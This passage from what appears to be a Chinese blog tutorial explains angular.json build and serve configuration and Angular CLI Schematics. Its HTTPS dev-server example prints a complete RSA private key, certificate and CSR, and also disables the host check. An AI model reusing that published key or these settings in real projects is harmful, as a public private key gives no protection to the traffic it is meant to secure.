<p>schematic-package：schematic-name:(object类型)，此对象包含schematic的配置选项，默认的json格式配置如下：</p> <ul><li>@schematics/angular:component</li> <li>@schematics/angular:directive</li> <li>@schematics/angular:module</li> <li>@schematics/angular:service</li> <li>@schematics/angular:pipe</li> <li>@schematics/angular:class</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 修改默认cli指令变量示例：</span>
<span class="token string">&quot;@schematics/angular:component&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token string">&quot;style&quot;</span><span class="token operator">:</span> <span class="token string">&quot;less&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;changeDetection&quot;</span><span class="token operator">:</span> <span class="token string">&quot;OnPush&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;export&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h3 id="architect配置项"><a href="#architect配置项" class="header-anchor">#</a> architect配置项</h3> <ul><li>targetName(string):目标架构名称,如build/serve/test/lint/e2e/extract-i18n
<ul><li>builder(string):目标的生成器，格式为：package-name：builder-name
<ul><li>options(string):生成器的配置选项，json格式的默认schematics如下：
<ul><li>@angular-devkit/build-angular:app-shell</li> <li>@angular-devkit/build-angular:browser</li> <li>@angular-devkit/build-angular:dev-server</li> <li>@angular-devkit/build-angular:extract-i18n</li> <li>@angular-devkit/build-angular:karma</li> <li>@angular-devkit/build-angular:protractor</li> <li>@angular-devkit/build-angular:server</li> <li>@angular-devkit/build-angular:tslint</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code>options：<span class="token punctuation">{</span>
    <span class="token string">&quot;customWebpackConfig&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;path&quot;</span><span class="token operator">:</span> <span class="token string">&quot;./webpack.config.js&quot;</span>
          <span class="token punctuation">}</span><span class="token punctuation">,</span>
          <span class="token string">&quot;outputPath&quot;</span><span class="token operator">:</span> <span class="token string">&quot;dist/ky-scholar-web&quot;</span><span class="token punctuation">,</span>
          <span class="token string">&quot;index&quot;</span><span class="token operator">:</span> <span class="token string">&quot;src/index.html&quot;</span><span class="token punctuation">,</span>
          <span class="token string">&quot;main&quot;</span><span class="token operator">:</span> <span class="token string">&quot;src/main.ts&quot;</span><span class="token punctuation">,</span>
          <span class="token string">&quot;polyfills&quot;</span><span class="token operator">:</span> <span class="token string">&quot;src/polyfills.ts&quot;</span><span class="token punctuation">,</span>
          <span class="token string">&quot;tsConfig&quot;</span><span class="token operator">:</span> <span class="token string">&quot;tsconfig.app.json&quot;</span><span class="token punctuation">,</span>
          <span class="token string">&quot;aot&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
          <span class="token string">&quot;stylePreprocessorOptions&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;includePaths&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span>
              <span class="token string">&quot;./src/style/&quot;</span><span class="token punctuation">,</span>
              <span class="token string">&quot;./core/less/&quot;</span>
            <span class="token punctuation">]</span>
          <span class="token punctuation">}</span><span class="token punctuation">,</span>
          <span class="token string">&quot;assets&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span>
            <span class="token string">&quot;src/favicon.ico&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;src/assets/images&quot;</span><span class="token punctuation">,</span>
            <span class="token punctuation">{</span>
              <span class="token string">&quot;glob&quot;</span><span class="token operator">:</span> <span class="token string">&quot;**/*&quot;</span><span class="token punctuation">,</span>
              <span class="token string">&quot;input&quot;</span><span class="token operator">:</span> <span class="token string">&quot;node_modules/@ant-design/icons-angular/src/inline-svg/&quot;</span><span class="token punctuation">,</span>
              <span class="token string">&quot;output&quot;</span><span class="token operator">:</span> <span class="token string">&quot;/assets/&quot;</span>
            <span class="token punctuation">}</span>
          <span class="token punctuation">]</span><span class="token punctuation">,</span>
          <span class="token string">&quot;styles&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span>
            <span class="token string">&quot;src/styles.less&quot;</span>
          <span class="token punctuation">]</span><span class="token punctuation">,</span>
          <span class="token string">&quot;scripts&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span>
          <span class="token punctuation">]</span>
    <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br></div></div></li></ul></li></ul></li> <li>configurations(object): 一些扩展的的配置，如webpack配置。
<ul><li>configurationName(object):生成器重写的部分配置</li></ul></li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token string">&quot;configurations&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token string">&quot;production&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                  <span class="token string">&quot;fileReplacements&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span>
                    <span class="token punctuation">{</span>
                      <span class="token string">&quot;replace&quot;</span><span class="token operator">:</span> <span class="token string">&quot;src/environments/environment.ts&quot;</span><span class="token punctuation">,</span>
                      <span class="token string">&quot;with&quot;</span><span class="token operator">:</span> <span class="token string">&quot;src/environments/environment.prod.ts&quot;</span>
                    <span class="token punctuation">}</span>
                  <span class="token punctuation">]</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;optimization&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;outputHashing&quot;</span><span class="token operator">:</span> <span class="token string">&quot;all&quot;</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;sourceMap&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;extractCss&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;namedChunks&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;extractLicenses&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;vendorChunk&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;buildOptimizer&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
                  <span class="token string">&quot;budgets&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span>
                    <span class="token punctuation">{</span>
                      <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;initial&quot;</span><span class="token punctuation">,</span>
                      <span class="token string">&quot;maximumWarning&quot;</span><span class="token operator">:</span> <span class="token string">&quot;4mb&quot;</span><span class="token punctuation">,</span>
                      <span class="token string">&quot;maximumError&quot;</span><span class="token operator">:</span> <span class="token string">&quot;5mb&quot;</span>
                    <span class="token punctuation">}</span><span class="token punctuation">,</span>
                    <span class="token punctuation">{</span>
                      <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;anyComponentStyle&quot;</span><span class="token punctuation">,</span>
                      <span class="token string">&quot;maximumWarning&quot;</span><span class="token operator">:</span> <span class="token string">&quot;6kb&quot;</span><span class="token punctuation">,</span>
                      <span class="token string">&quot;maximumError&quot;</span><span class="token operator">:</span> <span class="token string">&quot;10kb&quot;</span>
                    <span class="token punctuation">}</span>
                  <span class="token punctuation">]</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span>
       <span class="token string">&quot;development&quot;</span><span class="token operator">:</span><span class="token string">&quot;{....}&quot;</span><span class="token punctuation">,</span>
       <span class="token string">&quot;test&quot;</span><span class="token operator">:</span><span class="token string">&quot;{....}&quot;</span><span class="token punctuation">,</span>
       <span class="token string">&quot;intranet&quot;</span><span class="token operator">:</span><span class="token string">&quot;{....}&quot;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br></div></div><p>以上一把angular顶层配置全部过了一遍，关于angular.json所有配置项请查看<code>~node_modules\@angular\cli\lib\config\schema.json</code>,通俗易懂，有关于https，指定端口，地址等等的配置，相信你可以的。剩下的其实也不多了，我们更倾向于使用webpack.config.js,因为它更灵活。</p> <p>这里提供你参看，有关https证书参看我的另外一篇博文<a href="/vuebloger/technology/https证书全解.html#数字证书-自签名">https全解析</a>。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 在 projects 下的具体项目下architect的serve下：</span>
 <span class="token string">&quot;serve&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
          <span class="token string">&quot;builder&quot;</span><span class="token operator">:</span> <span class="token string">&quot;@angular-devkit/build-angular:dev-server&quot;</span><span class="token punctuation">,</span>
          <span class="token string">&quot;options&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;disableHostCheck&quot;</span><span class="token operator">:</span>   <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment">// 不显示回环地址警告</span>
            <span class="token string">&quot;proxyConfig&quot;</span><span class="token operator">:</span><span class="token string">&quot;proxyConfig.json&quot;</span><span class="token punctuation">,</span> <span class="token comment">//代理配置文件位置</span>
            <span class="token string">&quot;browserTarget&quot;</span><span class="token operator">:</span> <span class="token string">&quot;ky-scholar-web:build&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;port&quot;</span><span class="token operator">:</span> <span class="token number">4500</span><span class="token punctuation">,</span> <span class="token comment">// 指定端口</span>
            <span class="token string">&quot;open&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment">// 自动打开浏览器</span>
            <span class="token string">&quot;host&quot;</span><span class="token operator">:</span> <span class="token string">&quot;0.0.0.0&quot;</span><span class="token punctuation">,</span> <span class="token comment">// 指定回环地址</span>
            <span class="token string">&quot;ssl&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment">// 开启https</span>
            <span class="token string">&quot;sslKey&quot;</span><span class="token operator">:</span> <span class="token string">&quot;./private.key&quot;</span><span class="token punctuation">,</span> <span class="token comment">// 私钥地址</span>
            <span class="token string">&quot;sslCert&quot;</span><span class="token operator">:</span> <span class="token string">&quot;./file.crt&quot;</span> <span class="token comment">// 证书地址</span>
          <span class="token punctuation">}</span><span class="token punctuation">,</span>
          <span class="token string">&quot;configurations&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;production&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
              <span class="token string">&quot;browserTarget&quot;</span><span class="token operator">:</span> <span class="token string">&quot;ky-scholar-web:build:production&quot;</span>
            <span class="token punctuation">}</span>
          <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
<span class="token comment">// private.key</span>
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token constant">BEGIN</span> <span class="token constant">RSA</span> <span class="token constant">PRIVATE</span> <span class="token constant">KEY</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
MIICXQIBAAKBgQDXDc7hccraMODYXMKvU4Gkz3eYm9aIpUy6Rw0lKNCnUNwneBsb
YpoK<span class="token operator">/</span><span class="token constant">R</span><span class="token operator">+</span>c6lQup7QQba61U<span class="token operator">/</span>oiTxRDa0<span class="token operator">/</span>Ey9Pevds1lMCjMRIHNHu<span class="token operator">/</span>Xi9DeJtP2zxc
OGY9M4bjDBvmhLn9gK5TMo4OnfnF5aJ7FRsQ8uAtKB<span class="token operator">+</span>MjiMxzrfMTtvnbQIDAQAB
AoGBALMpbsyFZ9FlXT0D8rHsaRqsOV<span class="token operator">/</span>rnMyUohqirQHjQgnSpMdBGZw0Bk<span class="token operator">/</span>XV6n7
<span class="token number">0</span>wxXbP0u05l<span class="token operator">/</span>j<span class="token operator">+</span>lbZm9QjNFQWn4015iXMWGyJzb6GMcIA4qQMGIraLmC6O<span class="token operator">+</span>vIJQM
IdPJIh25GMeygwoc<span class="token operator">+</span>ysewJpzEDfhQMov5NzbusSCzKeCNfclAkEA9iz35iDv1wai
<span class="token number">4</span>hSh<span class="token operator">+</span>pgkbsdk01KTBX9I9pqM1kn4n2OO4BRKiVyHQLzZtjXtjKL8nvPSVyYEZEl<span class="token operator">/</span>
ss<span class="token operator">+</span>a6cEytwJBAN<span class="token operator">+</span>i4zMypChhwyszk19eJoSnbzY<span class="token operator">+</span>OcSA<span class="token operator">/</span><span class="token operator">+</span>AHYWrrpbjvkRapXLzk
XjrZeWHORQ5mRsy<span class="token operator">/</span>q0kpJajr4deiNR<span class="token operator">+</span>EQvsCQQCcsI6xabF<span class="token operator">/</span>Gfg<span class="token operator">/</span>EobvLDu0TzH7
<span class="token number">2</span>AlAbH4SiNiv5LFdMk9UjVXMDJsCN7ITakvjQjKtMeBmHAqbkrS3KbEerBwNAkAe
N20JYuNJTYRIVwynixobPGBLbPbzNRbdl0GzZ6mZpkztSe7s2tJckzvSWkN8YZdZ    
XOBw3y1meJCoSRNycbV3AkAaOlbCx0SzA9tLxMS4GS3oxlGp6YT97Cj0Yaxn9tGR
bicanvujQkXApc5EL46RIZg<span class="token operator">+</span>uy7upGSyHzccStk10Gdz
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token constant">END</span> <span class="token constant">RSA</span> <span class="token constant">PRIVATE</span> <span class="token constant">KEY</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token comment">// file.crt</span>
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token constant">BEGIN</span> <span class="token constant">CERTIFICATE</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
MIICATCCAWoCCQDOoKYEMyYu6TANBgkqhkiG9w0BAQsFADBFMQswCQYDVQQGEwJB
VTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0
cyBQdHkgTHRkMB4XDTIwMTExNzEwNDU1NloXDTMwMTExNTEwNDU1NlowRTELMAkG
A1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoMGEludGVybmV0
IFdpZGdpdHMgUHR5IEx0ZDCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEA1w3O
<span class="token number">4</span>XHK2jDg2FzCr1OBpM93mJvWiKVMukcNJSjQp1DcJ3gbG2KaCv0fnOpULqe0EG2u
tVP6Ik8UQ2tPxMvT3r3bNZTAozESBzR7v14vQ3ibT9s8XDhmPTOG4wwb5oS5<span class="token operator">/</span>YCu
UzKODp35xeWiexUbEPLgLSgfjI4jMc63zE7b520CAwEAATANBgkqhkiG9w0BAQsF
AAOBgQAwPw<span class="token operator">/</span>s<span class="token operator">+</span><span class="token number">3</span>rDyKUuN<span class="token operator">+</span><span class="token number">0</span>BBc5704UsWiqgCESsiv<span class="token operator">/</span>dVy49<span class="token operator">/</span>by53SmfaxHY6vmf
<span class="token number">3</span>dEAY3mzjcWz4ECBKZE<span class="token operator">/</span>K0dMx6bc<span class="token operator">+</span>l8Qm77OkdRdLAuKEpIhtH<span class="token operator">+</span>EgOp0gzBkGyRy
nPL8keQNhP2s0b2QoWYC8bWr<span class="token operator">+</span><span class="token number">532</span>nciC6N6YntNNpsK1cuDDRg<span class="token operator">==</span>
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token constant">END</span> <span class="token constant">CERTIFICATE</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token comment">// csr.key</span>
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token constant">BEGIN</span> <span class="token constant">CERTIFICATE</span> <span class="token constant">REQUEST</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
MIIBhDCB7gIBADBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEh
MB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIGfMA0GCSqGSIb3DQEB
AQUAA4GNADCBiQKBgQDXDc7hccraMODYXMKvU4Gkz3eYm9aIpUy6Rw0lKNCnUNwn
eBsbYpoK<span class="token operator">/</span><span class="token constant">R</span><span class="token operator">+</span>c6lQup7QQba61U<span class="token operator">/</span>oiTxRDa0<span class="token operator">/</span>Ey9Pevds1lMCjMRIHNHu<span class="token operator">/</span>Xi9DeJtP
<span class="token number">2</span>zxcOGY9M4bjDBvmhLn9gK5TMo4OnfnF5aJ7FRsQ8uAtKB<span class="token operator">+</span>MjiMxzrfMTtvnbQID
AQABoAAwDQYJKoZIhvcNAQELBQADgYEARcFf<span class="token operator">+</span><span class="token number">8</span>WtrzJjd7PKDtOtMfC9dz5NmmjG
NV1YKE5r3huw8MM4<span class="token operator">+</span>oNc3VEPdSGGgy5UBJmW45<span class="token operator">+</span><span class="token operator">/</span>fFDsSHcjWhfKJey0o<span class="token operator">/</span>amJnjh
<span class="token constant">RLR6R1</span><span class="token operator">+</span><span class="token constant">OPH</span><span class="token operator">+</span><span class="token number">3</span>u<span class="token operator">+</span><span class="token number">5</span>h7IjYdIU5SAztT7nVFSYAbKl92CjKRKQFEWF1jcxWiS1Guny4
ru22InqywU0<span class="token operator">=</span>
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token constant">END</span> <span class="token constant">CERTIFICATE</span> <span class="token constant">REQUEST</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br></div></div><div class="custom-block tip"><p class="custom-block-title">关于本地服务的多个静态文件夹托管/跨项目同域通讯/一个服务串起多个项目解析</p> <p>angular.json中我们配置serve指向build相同的配置。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token string">&quot;serve&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
          <span class="token string">&quot;builder&quot;</span><span class="token operator">:</span> <span class="token string">&quot;@angular-builders/custom-webpack:dev-server&quot;</span><span class="token punctuation">,</span>
          <span class="token string">&quot;options&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;browserTarget&quot;</span><span class="token operator">:</span> <span class="token string">&quot;ky-student-h5:build&quot;</span>
          <span class="token punctuation">}</span><span class="token punctuation">,</span>
          <span class="token string">&quot;configurations&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;production&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
              <span class="token string">&quot;browserTarget&quot;</span><span class="token operator">:</span> <span class="token string">&quot;ky-student-h5:build:production&quot;</span>
            <span class="token punctuation">}</span>
          <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>配置architect/build/options/assets可以指定打包后哪些文件复制到打包后的asset目录(或其他目录)，此时对于devServer来说就是托管的目录有了asset（或其他目录）文件夹，当然你可以增加其他目录扩展多个静态托管，利用这点可以承载其他项目以实现跨项目的同域通讯联调。</p> <p>事实上，angular本地跑最终是使用webpack-dev-server，webpack-dev-server在使用webpack监听内容改变打包插入一些列中间件如请求拦截的proxy-mmiddle-ware中间件最后使用express服务静态托管，本质只有一个服务，一个服务下的多个文件夹形成了多个文件夹托管，这是本质。angular.json有关文件复制的配置assets本质是在copy-webpack-plugins的封装。</p> <p>很多人常常把webpack的path、publicPath和contentBase和多个静态文件托管的功能联想到一起导致常常带来莫大的困惑。</p> <p>output中publicPath(打包生成的 index.html 文件里面引用资源的前缀)和devServer中的publicPath（用来设定虚拟路径）有一定关联，contentBase用来设置本地文件（非内存，即开发模式webpack打包的）托管。有关webpack的path、publicPath和contentBase的全解详见我的<a href="/vuebloger/technology/webpack中的path、publicPath和contentBase区别.html#webpack中的path、publicpath、contentbase的区分">另外一篇文章</a>。</p></div> <h2 id="angular-cli-schematics"><a href="#angular-cli-schematics" class="header-anchor">#</a> Angular Cli Schematics</h2> <p>接下来我们深入探究其中的原理。上面我们可以通过angular.json的schematics节点配置@schematics/angular:component修改默认cli指令生成组件示例,事实上,我们也可以自定义ng g component生成的模板文件，自定义cli指令，其中的关键就是Schematics，我们看下Schematics是什么以及它如何用来自定义cli指令，这有助于我们进一步了解angular.json配置。</p> <p>Schematics 是现代前端开发工作流的工具；它可以将变化应用到你的项目中。比如创建一个组件、添加配置项、将框架添加到现有项目，或者更新你的代码来修复更新依赖时带来的 break change。
在angular中它是一个独立的文件处理工具，位于 Angular Devkit。可以用于任意的文件树变换，而不仅仅是创建新文件。Angular CLI 命令：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>ng generate component
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>实际上是：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>ng generate @schematics<span class="token operator">/</span>angular<span class="token operator">:</span>component
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>的简写。 它的工作原理是：</p> <ul><li>首先会找到 @schematics/angular 这个 Package；</li> <li>从 package.json 中找到 Schematics 配置文件；</li> <li>从配置文件的支持列表中找到 compoennt 项，得到可执行文件；</li> <li>验证 Schema 配置与命令行参数是否匹配；</li> <li>执行步骤中从文件池读取模版文件，使用输入参数替换占位符；</li> <li>顺便修改 NgModule 的 declarations 配置（实际先执行）；</li></ul> <p>Angular 允许三方库自定义 Schematics，比如：</p> <ul><li><code>ng add ng-zorro-antd</code> 将 ng-zorro-antd 添加到你的项目中</li> <li><code>ng g ng-zorro-antd:layout-top-side --name=[name]</code> 创建一个带布局的组件</li></ul> <p>简单地说，每个 Schematics Lib 包含：</p> <ul><li>执行步骤定义：对文件树的变换内容；</li> <li>Schama 定义：用于验证用户输入；</li> <li>（可选）文件池：预先准备的文件模版；</li></ul> <p>因此任何 Angular Lib 都可以对此进行扩展，Angular Material 也有相应的组件模版定义，可以通过 ng 命令来快速创建特定组件。事实上Schematics 的实现机制完全与 Angular 无关， Angular CLI 帮我们调用了一下 Schematics，Schematics 自身也有 CLI 工具，其它项目也可以通过 Schematics CLI 来使用。</p> <h3 id="schematics一些基本概念"><a href="#schematics一些基本概念" class="header-anchor">#</a> Schematics一些基本概念</h3> <ul><li>Schematics：Schematics全称是Schematics Scematics。顾名思义，就是按照一系列的步骤来做完一些事情。一个Schematics就是对代码文件一系列操作的合集。</li> <li>Collection：一个Collection是数个Schematics合集，因此Collection又被称作Schematics Collection。
Tree：在Schematics中，Tree将真实文件目录（项目中的代码文件）数据拷贝进一个树状结构里，你对代码文件的所有操作都会被缓存在Tree中，而不会对文件进行实时操作。你可以将它理解成一个沙盒。Tree有两个部分，一个是base（真实文件目录），一个是staging area（沙盒），你的变动都会发生在staging area，除非你写入了base部分。
Rule：一个Rule是一个方法。它获取一个Tree，并返回经过改变的一个新的Tree。因此我们对Tree的操作也基本上在Rule中发生。所以可以说，一个Schematic就是一个Rule。
Source：用来从真实文件目录创建Tree。
Action：对Tree的具体操作。</li></ul> <p>由此看来，一个Schematics工程由Collection组成，一个Collection中有若干个Schematics，每一个Schematics又会有若干个Rules去处理一个或多个Tree（如果需要的话）。以上这些就是Schematics你暂时需要了解的所有基本概念。具体的信息可以查看<a href="https://www.npmjs.com/package/@angular-devkit/schematics" target="_blank" rel="noopener noreferrer">使用文档<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>。</p> <p>Schematics 一共包含四个指令：</p> <ul><li>add 添加一个 Library 至项目</li> <li>new 创建一个新 Angular 项目</li> <li>generate 基于 Schematics 创建或修改文件</li> <li>update 更新应用程序或依赖项</li></ul> <p>其实除了 add 会事先执行一次 npm i （取决于 angular.json 的 cli/packageManager 配置值，默认：npm）指令以外，其他指令实际上都是基于 Schematics 创建或修改文件。</p> <p>generate 指令会更纯粹，需要你手动指定 Schematic 名称，例如：<code>ng g class &lt;ClassName&gt;</code>。其他三个指令是对其进一步简化，像 ng add 实际相当于 ng g ng-add 这里的 ng-add 是固定名称，若你希望创建一个支持 ng add 那么你就必须有一个 ng-add 的 Schematic。</p> <p>angular.json 与 Schematic 有着非常密切的关系，大多数需要通过 angular.json 配置信息来获取目录路径、默认配置项等信息。特别是当编写 Schematic 时总是需要考虑多项目的情况，因此绝大多数都需要依赖 angular.json 来确认具体项目名及路径信息。</p> <p>每一个 Schematic 指令都有相应的参数信息，这些参数信息也可以直接被映射在 angular.json 上面并当成默认参数值：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">{</span>
    <span class="token string">&quot;schematics&quot;</span><span class="token operator">:</span><span class="token punctuation">{</span>
        <span class="token string">&quot;ng-alain:list&quot;</span><span class="token operator">:</span><span class="token punctuation">{</span>
            <span class="token string">&quot;spec&quot;</span><span class="token operator">:</span><span class="token boolean">false</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token string">&quot;@schematics/angular:component&quot;</span><span class="token operator">:</span><span class="token punctuation">{</span>
            <span class="token string">&quot;spec&quot;</span><span class="token operator">:</span><span class="token boolean">false</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
